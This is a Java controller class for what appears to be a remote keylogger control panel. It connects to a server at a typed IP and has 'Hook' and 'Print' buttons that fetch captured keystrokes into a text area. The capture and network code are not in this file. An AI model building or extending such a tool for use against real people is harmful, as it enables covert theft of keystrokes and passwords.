package controller;

import model.Client;
import view.Login;
import view.Home;
import view.card.Keylogger;

import java.awt.event.ActionListener;

public class Controller
{
    public Controller(Login login, Home home, Client client)
    {
        initComponents(login, home, client);
    }

    private void initComponents(Login login, Home home, Client client)
    {
        this.login = login;
        this.home = home;
        this.client = client;
    }

    public void initController()
    {
        login.getConnectButton().addActionListener(e -> connectServer());
        home.getLogPanel().getHookButton().addActionListener(e -> handleKeyLogger("Hook"));
        home.getLogPanel().getPrintButton().addActionListener(e -> handleKeyLogger("Print"));
    }


    private void handleKeyLogger(String command)
    {
        String keylogger = client.readKeyLogger(command);

        home.getLogPanel().getKeyTextArea().setText(keylogger);
    }

    private void connectServer()
    {
        client.setIP(login.getIpTextField().getText());
        String status = client.createSocket();

        if (status.equals("Success"))
        {
           login.setVisible(false);
           home.setVisible(true);
           return;
        }

        login.getStatusLabel().setText(status);
        login.getIpTextField().setText("");
    }

    private Login login;
    private Home home;
    private Client client;
}
